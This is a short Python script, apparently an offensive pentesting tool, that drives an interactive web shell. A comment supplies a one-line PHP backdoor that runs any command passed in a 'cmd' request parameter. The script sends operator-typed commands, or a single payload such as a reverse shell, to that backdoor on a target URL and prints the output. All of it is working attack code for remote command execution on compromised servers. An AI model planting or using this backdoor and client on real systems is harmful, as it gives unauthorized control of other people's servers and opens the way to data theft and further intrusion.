import argparse
import time
import requests
import os

# needs php file on target: <?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>

# Set up argument parsing
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs")
parser.add_argument("-t", "--target", help="Specify the target URL (e.g., http://<TARGET IP>:3001/uploads/backdoor.php)", required=True)
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload (e.g., a Python3 reverse shell)")
parser.add_argument("-o", "--option", help="Interactive Web Shell loop mode (use: -o yes)")

args = parser.parse_args()

# Handle a single request with payload
if args.target and args.payload:
    response = requests.get(f"{args.target}/?cmd={args.payload}")
    print(response.text)

# Handle interactive shell mode
if args.target and args.option == "yes":
    os.system("clear")
    while True:
        try:
            cmd = input("$ ")
            response = requests.get(f"{args.target}/?cmd={cmd}")
            print(response.text)
            time.sleep(0.3)
        except requests.exceptions.InvalidSchema:
            print("Invalid URL schema: use http:// or https://")
        except requests.exceptions.ConnectionError:
            print("Invalid URL")
